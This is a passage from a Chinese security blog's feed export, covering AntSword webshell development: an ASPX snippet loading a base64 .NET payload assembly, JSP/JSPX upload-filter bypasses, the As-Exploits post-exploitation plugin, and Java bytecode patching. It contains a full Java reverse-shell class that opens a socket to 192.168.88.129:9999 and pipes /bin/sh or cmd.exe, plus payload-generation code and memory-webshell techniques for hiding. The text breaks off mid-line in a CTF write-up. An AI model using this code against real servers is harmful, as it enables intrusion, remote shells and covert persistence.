QAAxCUAAMQHAABSU0RTOaWA97zcx0qN4uxJUEp93wEAAABEOlxSaWRlclByb2plY3RzXERsbFRlc3RcQW50UGF5bG9hZFxvYmpcUmVsZWFzZVxBbnRQYXlsb2FkLnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgnAAAAAAAAAAAAACInAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAAsAwAAAAAAAAAAAAAsAzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEjAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAaAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAD4ACwABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABBAG4AdABQAGEAeQBsAG8AYQBkAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA+AA8AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEEAbgB0AFAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMgAxAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQQBuAHQAUABhAHkAbABvAGEAZAAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbgB0AFAAYQB5AGwAbwBhAGQAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwquot;; var type = Type.GetType(&quot;AntPayload.Run&quot;); if (type != null) &#123; Response.Write(type + &quot; exists&quot;); //var obj=System.Activator.CreateInstance(type); //obj.Equals(&quot;&quot;); var assembly = System.Reflection.Assembly.GetExecutingAssembly(); var obj = assembly.CreateInstance(&quot;AntPayload.Run&quot;); obj.Equals(&quot;&quot;); &#125; else &#123; Response.Write(type + &quot; not exists&quot;); var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)); var myPaylaod = myAssebly.CreateInstance(&quot;AntPayload.Run&quot;); myPaylaod.Equals(&quot;&quot;); //myAssebly.GetType(&quot;AntPayload.Run&quot;).GetConstructor(new Type[0]).Invoke(null).Equals(&quot;&quot;); &#125;%&gt;发现 Type.GetType 永远为undefined。以为是函数用的不对，后来又换了System.Reflection.Assembly.GetCallingAssembly().GetType，System.Reflection.Assembly.GetExecutingAssembly().GetType都不行。接着发现虽然把代码直接写在jscript中可以多次稳定触发，如果把以上代码通过eval打进入仍然会报上面类型转换的错误。另外还发现一些奇怪的地方，如果直接代码写在jscript文件中可以用这种写法：12var obj=System.Activator.CreateInstance(type);obj.Equals(&quot;&quot;);但是如果通过eval传进去就只能用这种写法123var assembly = System.Reflection.Assembly.GetExecutingAssembly();var obj = assembly.CreateInstance(&quot;AntPayload.Run&quot;);obj.Equals(&quot;&quot;);否则会报如下错误，谷歌也没查到怎么解决，神秘。问题解决试了很多办法都失败了，后来谷歌搜到了一篇2012年的博客遇到了同样的问题，大概意思是说两次的assembly被加载到了不同的上下文中，所以被当作成为不同的类，无法进行类型转换。跟北辰师傅研究了一番后，北辰师傅想到一种方法：把第一次加载后的assembly的引用给存到当前Application的上下文中，即HttpContext.Current.Application这个类里面，然后再通过Application.Get(“ant”)拿到引用，然后反射，再获取实例化，这样就可以解决上下文不同的问题。payload修改如下123var Payload=&quot;xxxxx&quot;;HttpContext.Current.Application.Add(&quot;ant&quot;, System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)));HttpContext.Current.Application.Get(&quot;ant&quot;).GetType(&quot;AntPayload.Run&quot;).GetConstructor(new Type[0]).Invoke(null).Equals(this);然后通过eval打过去，此时就可以多次稳定触发payload了。最后特别感谢北辰师傅的交流探讨！初学.net，有些地方是凭借自己的理解写的，如果有说的不对的地方欢迎指出，以免误导他人。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[星球问答：一次jsp上传绕过的思考]]></title>
    <url>%2Fposts%2Fjsp-webshell-upload-bypass%2F</url>
    <content type="text"><![CDATA[背景前几天有个小伙伴做项目的时候遇到一个问题来问我，大概情况如下：jsp的站，可以任意文件上传上传jsp会把&lt;%中的&lt;给转义掉上传jspx会把jsp:scriptlet到&lt;/jsp:scriptlet&gt;中的内容替换为空问有什么突破办法？当时研究了一下后jsp和jspx各给了一个解决方案，后来发到星球里后@hosch3n师傅又提出了一种新的方案，tql解决方案其实问题等价于：jsp不使用&lt;% %&gt;标签如何执行命令jspx不使用jsp:scriptlet &lt;/jsp:scriptlet&gt;如何执行命令jsp利用EL表达式绕过jsp是默认解析el表达式的，并且在没有jsp标签的情况下也可以直接执行，这样就可以绕过jsp的限制。星球里面@Gh0stFx也提到了这一点jspx利用命名空间绕过因为jspx实际上是jsp的xml写法，所以继承了xml的所有特性，例如cdata跟html实体编码等，同样也继承了命名空间的特性。https://www.runoob.com/xml/xml-namespaces.html在jsp:scriptlet这个标签中，jsp就是默认的命名空间，但是实际上可以随意替换成其他名字这样就绕过了对jsp:scriptlet的过滤jspx利用jsp:expression绕过在jsp中可以利用表达式绕过，那么jspx中同样也可以，以下是jsp跟jspx语法的对照：JSP语法JSP document语法Page Directive&lt;%@ page %&gt;&lt;jsp:directive.page /&gt;Include Directive&lt;%@ include %&gt;&lt;jsp:directive.include /&gt;Tag Library Directive&lt;%@ taglib %&gt;xmlns:prefix=”Library URI”Declartion&lt;%! … %&gt;jsp:declaration … &lt;/jsp:declaration&gt;Scriplet&lt;% … %&gt;jsp:scriptlet … &lt;/jsp:scriptlet&gt;Expression&lt;%= … %&gt;jsp:expression … &lt;/jsp:expression&gt;Comment&lt;%-- … --%&gt;这个方法是@hosch3n师傅提出来的，把表达式写到jspx中，同样可以达到执行命令的目的]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[As-Exploits: 中国蚁剑后渗透框架]]></title>
    <url>%2Fposts%2Fas-exploits%2F</url>
    <content type="text"><![CDATA[前言冰蝎跟哥斯拉都有了各自的一些后渗透模块，然而蚁剑这一块基本还是空缺，所以就萌生出来做一个蚁剑的后渗透框架插件的想法。目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。因为http是无状态的，webshell能做的事情其实很有限，所以插件功能的重点主要放在msf，nmap等其他工具的联动上面，把专业的事情交给专业的工具去做。总体设计一个模块在初始化之后的流程大概是这样当exploit事件发生时，会调用getArgs跟genPayload函数来组合成最后的payload，默认将回显数据发送到编辑框里。模块介绍简单的塞一些模块，没错我就是缝合怪。基本信息获取当前服务端信息。反弹Shell跟MSF联动，与冰蝎和哥斯拉相比新增了bind类型的payload。目前支持以下类型：java/meterpreter/reverse_tcpjava/shell/reverse_tcpjava/meterpreter/bind_tcpjava/shell/bind_tcpphp/meterpreter/reverse_tcpphp/shell/reverse_tcpphp/meterpreter/bind_tcpphp/shell/bind_tcp内存马一键打入内存Webshell。由于时间仓促，目前仅支持Servlet型内存马。核心payload修改自哥斯拉，继承了nolog的功能，即内存马不会在tomcat中留下日志。可打入的内存马种类：AntSwordBehinderGodzilla-Base64reGerog其中组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。内存马管理获取当前Servlet卸载指定Servlet杀软识别数据来源是key师傅的项目：avList通过tasklist /svc获取当前进程列表，识别出其中的杀软。目前支持手动跟自动两种获取方式：自动获取自动执行系统命令tasklist /svc并分析回显数据。手动获取手动输入tasklist /svc的结果。如何用node修改java字节码在本插件中所有额外参数都采用了直接修改字节码，而没有采用额外参数的方式来传参。蚁剑没有java环境，那么是如何做到用node修改字节码的呢？详细的例子可以看我博客这篇文章：无java环境修改字节码其实我们的需求无非只是修改变量池中的一个字符串，并不需要asm框架那么强大的功能。java字节码常量池中共有14种类型，如下表格所示：注意上面的表格的单位是错的，应该是byte不是bit我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。也就是说关键的结构就是这个其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。把yan表哥的代码抽出来修改一下，yan表哥yyds。123456789101112131415161718192021222324function replaceClassStringVar(b64code, oldvar, newvar) &#123; let code = Buffer.from(b64code, &apos;base64&apos;);//解码 let hexcode = code.toString(&apos;hex&apos;);//转为16进制 let hexoldvar = Buffer.from(oldvar).toString(&apos;hex&apos;);//转为16进制 let oldpos = hexcode.indexOf(hexoldvar); if (oldpos &gt; -1) &#123;//判断字节码中是否包含目标字符串 let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度 let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(newvar).toString(&apos;hex&apos;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容 return Buffer.from(retcode, &apos;hex&apos;).toString(&apos;base64&apos;);//base64编码 &#125; return b64code; &#125; function decimalToHex(d, padding) &#123; var hex = Number(d).toString(16); padding = typeof (padding) === &quot;undefined&quot; || padding === null ? padding = 2 : padding; while (hex.length &lt; padding) &#123; hex = &quot;0&quot; + hex;//小于padding长度就填充0 &#125; return hex; &#125;content=`xxxxxxxxxxxxx`//要替换的字节码content=replaceClassStringVar(content,&apos;targetIP&apos;,&apos;192.168.88.129&apos;)content=replaceClassStringVar(content,&apos;targetPORT&apos;,&apos;9999&apos;)console.log(content)编写模块父类BaseBase是所有模块的基类，放了一些默认的方法。顺着代码来说吧。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186&quot;use strict&quot;;const LANG = require(&quot;../language&quot;); // 插件语言库const LANG_T = antSword[&quot;language&quot;][&quot;toastr&quot;]; // 通用通知提示const path = require(&quot;path&quot;);class Base &#123; constructor(top) &#123;//获取顶层对象 this.top = top; this.opt = this.top.opt; this.shelltype = this.top.opt.type; this.win = this.top.win; this.payloadtype=&quot;default&quot;; this.precheck(); &#125; precheck() &#123; //检查模块是否适用于当前shell类型 return true; &#125; //获取payload模板 getTemplate(shelltype, payloadtype) &#123; //从当前目录下payload.js中获取payload let payload = require(path.join(__dirname, this.name, &quot;payload&quot;)); return payload[shelltype][payloadtype]; &#125; //拼接参数 genPayload(args) &#123; //从模板中拼接参数 let payload = this.getTemplate(this.shelltype, this.payloadtype); if (this.shelltype == &quot;jsp&quot;) &#123; //如果是jsp类型就用字节码的方式修改 for (let i in args) &#123; payload = this.replaceClassStringVar(payload, i, args[i]); &#125; &#125; else &#123; //否则直接进行字符串替换 for (let i in args) &#123; payload = payload.replace(new RegExp(i, &quot;g&quot;), args[i]); &#125; &#125; return payload; &#125; //获取表单参数 getArgs() &#123; //所有表单参数要形成一个字典 return &#123;&#125;; &#125; //执行 exploit() &#123; // exploit！ console.log(&quot;exploit!&quot;); self.core = this.top.core; let args = this.getArgs(); //获取参数 let payload = this.genPayload(args); //拼接，生成payload self.core .request(&#123; _: payload, //发送payload &#125;) .then((_ret) =&gt; &#123; let res = antSword.unxss(_ret[&quot;text&quot;], false); //过滤xss if (res === &quot;&quot;) &#123; res = &quot;output is empty.&quot;; &#125; this.editor.session.setValue(res); //回显内容到输出结果 this.editor.setReadOnly(true); toastr.success(LANG[&quot;success&quot;], LANG_T[&quot;success&quot;]); &#125;) .catch((e) =&gt; &#123; console.log(e); toastr.error(JSON.stringify(e), &quot;Error&quot;); &#125;); &#125; setName(name) &#123; this.name = name; //每个模块实例化之后要有个唯一的名字 &#125; createLayout(tabbar) &#123; //创建tab，总布局 tabbar.addTab(this.name, LANG[&quot;core&quot;][this.name][&quot;title&quot;]); let tab = tabbar.cells(this.name); this.tab = tab; if (this.name == &quot;base_info&quot;) &#123; //把基本信息设为首页 tab.setActive(); &#125; let layout = tab.attachLayout(&quot;2E&quot;); this.layout = layout; let cellA = layout.cells(&quot;a&quot;); this.cellA=cellA; cellA.hideHeader(); let cellB = layout.cells(&quot;b&quot;); cellB.setText(LANG[&quot;result_title&quot;]); this.cellB=cellB; this.createEditor(cellB); this.createToolbar(cellA); this.createForm(cellA); &#125; createEditor(cell) &#123; //输出结果默认是编辑器的格式，方便复制 this.editor = null; // 初始化编辑器 this.editor = ace.edit(cell.cell.lastChild); this.editor.$blockScrolling = Infinity; this.editor.setTheme(&quot;ace/theme/tomorrow&quot;); // this.editor.session.setMode(`ace/mode/html`); this.editor.session.setUseWrapMode(true); this.editor.session.setWrapLimitRange(null, null); this.editor.setOptions(&#123; fontSize: &quot;14px&quot;, enableBasicAutocompletion: true, enableSnippets: true, enableLiveAutocompletion: true, &#125;); // 编辑器快捷键 this.editor.commands.addCommand(&#123; name: &quot;import&quot;, bindKey: &#123; win: &quot;Ctrl-S&quot;, mac: &quot;Command-S&quot;, &#125;, exec: () =&gt; &#123; // this.toolbar.callEvent(&quot;onClick&quot;, [&quot;import&quot;]); &#125;, &#125;); const inter = setInterval(this.editor.resize.bind(this.editor), 200); this.win.win.attachEvent(&quot;onClose&quot;, () =&gt; &#123; clearInterval(inter); return true; &#125;); &#125; createForm(cell) &#123; //edit your code &#125; createToolbar(cell) &#123; // 初始化exploit按钮，监听onClick事件 let self = this; let toolbar = cell.attachToolbar(); toolbar.attachEvent(&quot;onClick&quot;, function (id) &#123; try &#123; self.exploit(); &#125; catch (e) &#123; toastr.error(JSON.stringify(e), LANG_T[&apos;error&apos;]); &#125; &#125;); toolbar.loadStruct( &apos;&lt;toolbar&gt;&lt;item type=&quot;button&quot; id=&quot;exploit&quot; text=&quot;exploit&quot; title=&quot;&quot; /&gt;&lt;/toolbar&gt;&apos;, function () &#123;&#125; ); if(this.precheck()==false)&#123; //如果precheck不通过，按钮将变成灰色。 toolbar.disableItem(&apos;exploit&apos;); &#125; this.toolbar=toolbar; &#125; replaceClassStringVar(b64code, oldvar, newvar) &#123; //字节码修改函数 let code = Buffer.from(b64code, &quot;base64&quot;); let hexcode = code.toString(&quot;hex&quot;); let hexoldvar = Buffer.from(oldvar).toString(&quot;hex&quot;); let oldpos = hexcode.indexOf(hexoldvar); if (oldpos &gt; -1) &#123; let newlength = this.decimalToHex(newvar.length, 4); let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from( newvar ).toString(&quot;hex&quot;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`; return Buffer.from(retcode, &quot;hex&quot;).toString(&quot;base64&quot;); &#125; // console.log(&apos;nonono&apos;) return b64code; &#125; decimalToHex(d, padding) &#123; let hex = Number(d).toString(16); padding = typeof padding === &quot;undefined&quot; || padding === null ? (padding = 2) : padding; while (hex.length &lt; padding) &#123; hex = &quot;0&quot; + hex; &#125; return hex; &#125; safeHTML(cell, html = &quot;&quot;, sandbox = &quot;&quot;) &#123; //当渲染html时一定要用此函数处理，否则可能会产生rce let _html = Buffer.from(html).toString(&quot;base64&quot;); // https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox let _iframe = `&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;iframe sandbox=&quot;$&#123;sandbox&#125;&quot; src=&quot;data:text/html;base64,$&#123;_html&#125;&quot; style=&quot;width:100%;height:100%;border:0;padding:0;margin:0;&quot;&gt; &lt;/iframe&gt; `; cell.attachHTMLString(_iframe); return this; &#125;&#125;module.exports = Base;简单的例子举一个简单的例子，执行系统命令并获取回显。首先给插件起个炫酷的名字叫test，加入到根目录index.js的Modules里面。然后在language\zh.js中增加对应的标签名字：测试。接着新增一个test目录，这里的目录名称要与模块的名称一致，里面放两个文件：index.js跟payload.js。在index.js中主要写逻辑处理部分，payload.js里面只放payload。payload.js默认的payload叫default。payload中把参数部分用一个特殊的名字标记出来，叫做 test_command 。JSP类型同理，放base64格式的字节码。123456789module.exports=&#123; php:&#123; default:`system(&quot;test_command&quot;);` &#125;, jsp:&#123; default:`` &#125;&#125;;index.js因为例子中需要额外的参数，所以要重写父类的createForm函数跟getArgs函数，把表单中获取到的test_command放入args里面。1234567891011121314151617181920212223242526&quot;use strict&quot;;const Base = require(&quot;../base&quot;);class Test extends Base &#123; createForm(cell) &#123; var str = [ &#123; type: &quot;input&quot;, name: &quot;test_command&quot;, label: &quot;执行命令&quot;, labelWidth: 150, labelAlign:&quot;center&quot;, inputWidth: 200, &#125;, ]; var form = cell.attachForm(str); this.form = form; &#125; getArgs() &#123; let args = &#123;&#125;; this.payloadtype = &quot;default&quot;; args[&quot;test_command&quot;] = this.form.getItemValue(&quot;test_command&quot;); return args; &#125;&#125;module.exports = Test;运行结果重启蚁剑后再打开插件就可以使用我们的新模块了，是不是很简单？最后目前payload主要来自冰蝎跟哥斯拉，向前辈们致敬！框架的优势就在于看到其他同类工具的比较好的功能可以迅速白嫖。这个功能不错，下一秒就是我的了.jpg项目地址：https://github.com/yzddmr6/As-Exploits]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无java环境修改字节码]]></title>
    <url>%2Fposts%2Fnode-edit-java-class%2F</url>
    <content type="text"><![CDATA[前言上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其中的一个点：无java环境如何修改字节码。正文需求在蚁剑改造计划之实现JSP一句话中，当时为了解决硬编码字节码的问题采用了额外参数的方式来传参。但是同时带来的问题就是键名的固定跟额外带来的编码问题，很容易成为一个特征。例如1POST: ant=xxxxxxxxxxxxxxx&amp;var1=/bin/bash&amp;var2=whoami蚁剑没有java环境，所以没办法像冰蝎一样调用asm框架来修改字节码。但是我们也不需要asm框架那么强大的功能，实际上只需要修改其中的一个字符串的值就可以了，那么怎么实现呢？这个要从字节码的结构说起。Java字节码结构这里以As_Exploits中的jsp反弹shell的payload为例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import java.io.*;import java.net.Socket;public class ShellReverseTCP extends Thread &#123; InputStream zj; OutputStream sd; public static String ip; public static String port; ShellReverseTCP(InputStream zj, OutputStream sd) &#123; this.zj = zj; this.sd = sd; &#125; public ShellReverseTCP() &#123; &#125; @Override public boolean equals(Object obj)&#123; ip=&quot;targetIP&quot;; port=&quot;targetPORT&quot;; try &#123; RunShellReverseTCP(); return true; &#125;catch (Exception e)&#123; return false; &#125; &#125; public static void main(String[] args) &#123; ip=&quot;192.168.88.129&quot;; port=&quot;9999&quot;; ShellReverseTCP shellReverseTCP = new ShellReverseTCP(); shellReverseTCP.RunShellReverseTCP(); &#125; public void RunShellReverseTCP() &#123; try &#123; String ShellPath; if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) &#123; ShellPath = new String(&quot;/bin/sh&quot;); &#125; else &#123; ShellPath = new String(&quot;cmd.exe&quot;); &#125; Socket socket = new Socket(ip, Integer.parseInt(port)); Process process = Runtime.getRuntime().exec(ShellPath); (new ShellReverseTCP(process.getInputStream(), socket.getOutputStream())).start(); (new ShellReverseTCP(socket.getInputStream(), process.getOutputStream())).start(); &#125; catch (Exception e) &#123; &#125; &#125; public void run() &#123; BufferedReader yx = null; BufferedWriter jah = null; try &#123; yx = new BufferedReader(new InputStreamReader(this.zj)); jah = new BufferedWriter(new OutputStreamWriter(this.sd)); char buffer[] = new char[8192]; int length; while ((length = yx.read(buffer, 0, buffer.length)) &gt; 0) &#123; jah.write(buffer, 0, length); jah.flush(); &#125; &#125; catch (Exception e) &#123; &#125; try &#123; if (yx != null) yx.close(); if (jah != null) jah.close(); &#125; catch (Exception e) &#123; &#125; &#125;&#125;main函数是调试用的不用管，入口是equals函数，我们的目的就是把其中的targetIP跟targetPORT替换为我们的目标IP跟端口。用010editor打开编译后的字节码文件查看。最开始的CAFEBABE叫做魔数，用来标志这是一个字节码文件。00 00 00 34是版本号，0x34转为10进制是52，查表知是jdk1.8。后面还有import的相关类的信息，因为不是重点，这里不再过多说明，快进到常量池。常量池中的每一项都是一个表，其项目类型共有14种，如下表格所示：类型标志描述CONSTANT_utf8_info1UTF-8编码的字符串CONSTANT_Integer_info3整形字面量CONSTANT_Float_info4浮点型字面量CONSTANT_Long_info5长整型字面量CONSTANT_Double_info6双精度浮点型字面量CONSTANT_Class_info7类或接口的符号引用CONSTANT_String_info8字符串类型字面量CONSTANT_Fieldref_info9字段的符号引用CONSTANT_Methodref_info10类中方法的符号引用CONSTANT_InterfaceMethodref_info11接口中方法的符号引用CONSTANT_NameAndType_info12字段或方法的符号引用CONSTANT_MethodHandle_info15表示方法句柄CONSTANT_MothodType_info16标志方法类型CONSTANT_InvokeDynamic_info18表示一个动态方法调用点这14种类型的结构各不相同，如下表格所示：``注：上面的表格的单位是错的，应该是byte不是bit，不知道哪里的以讹传讹一直流传了下来。从上面的表格可以看到，虽然每一项的结构都各不相同，但是他们有个共同点，就是每一项的第一个字节都是一个标志位，标识这一项是哪种类型的常量。我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。也就是说关键的结构就是这个其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。结合文件来看targetIP共占了8个byte，也就是16个hex的位。所以前面两个byte是00 08。然后再之前的一个byte是01，表示这是一个CONSTANT_utf8_info。如何修改既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。把yan表哥的代码抽出来修改一下12345678910111213141516171819202122232425262728function replaceClassStringVar(b64code, oldvar, newvar) &#123; let code = Buffer.from(b64code, &apos;base64&apos;);//解码 let hexcode = code.toString(&apos;hex&apos;);//转为16进制 let hexoldvar = Buffer.from(oldvar).toString(&apos;hex&apos;);//转为16进制 let oldpos = hexcode.indexOf(hexoldvar); if (oldpos &gt; -1) &#123;//判断字节码中是否包含目标字符串 let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度 let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(newvar).toString(&apos;hex&apos;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容 return Buffer.from(retcode, &apos;hex&apos;).toString(&apos;base64&apos;);//base64编码 &#125; console.log(&apos;nonono&apos;) return b64code; &#125; function decimalToHex(d, padding) &#123; var hex = Number(d).toString(16); padding = typeof (padding) === &quot;undefined&quot; || padding === null ? padding = 2 : padding; while (hex.length &lt; padding) &#123; hex = &quot;0&quot; + hex;//小于padding长度就填充0 &#125; return hex; &#125;content=`xxxxxxxxxxxxx`//要替换的字节码content=replaceClassStringVar(content,&apos;targetIP&apos;,&apos;192.168.88.129&apos;)content=replaceClassStringVar(content,&apos;targetPORT&apos;,&apos;9999&apos;)console.log(content)用命令还原一下文件1echo -n xxxxxx |baes64 -d |tee after.class看一下修改后的结果192.168.88.129总共是14个byte，换成16进制就是0xe，刚好符合。实际中是否能用呢？回车，获得会话，说明修改是有效的。最后As_Exploits还在开发中，不得不说很麻烦，同一个功能要写asp/aspx/php/jsp四份代码。后端还可以写写，前端是真的要现学，不过还是可以期待一下。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[蚁剑改造计划之支持内存马]]></title>
    <url>%2Fposts%2Fantsword-diy-5%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
  </entry>
  <entry>
    <title><![CDATA[Tomcat内存Webshell解析之Listener型]]></title>
    <url>%2Fposts%2Ftomcat-memory-webshell-listener%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Tomcat内存Webshell解析之Filter型]]></title>
    <url>%2Fposts%2Ftomcat-memory-webshell-filter%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ASP/ASPX下的流量混淆]]></title>
    <url>%2Fposts%2Fasp-aspx-encoders%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[从一道CTF的非预期解看PHP反斜杠匹配问题]]></title>
    <url>%2Fposts%2Fphp-preg-tricks%2F</url>
    <content type="text"><![CDATA[前言刷buuoj的时候遇到[安洵杯 2019]easy_web 这样一个题，做一半看到他这个正则写的有点问题，就去翻wp。找到了官方的wp发现果然是个非预期。但是官方wp中并没有深入说明。后来看到评论去翻出题人的博客也没找到相关的信息，加上看到了其他wp中一些不准确的说法，所以今天就有了这篇文章来讲一讲自己的看法。正文题目源码12345678910111213141516171819202122232425262728&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&apos;content-type:text/html;charset=utf-8&apos;);$cmd = $_GET[&apos;cmd&apos;];if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;])) header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;; die(&quot;xixi～ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) 